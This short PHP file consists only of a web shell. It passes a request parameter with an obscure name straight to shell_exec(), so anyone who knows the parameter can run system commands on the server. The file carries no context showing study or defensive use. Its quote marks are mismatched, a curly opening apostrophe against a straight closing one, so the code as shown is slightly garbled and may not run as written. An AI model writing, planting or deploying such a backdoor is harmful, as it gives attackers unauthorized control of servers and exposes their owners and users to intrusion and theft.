<?php
shell_exec($_GET[’L2qouigQ']);
?>
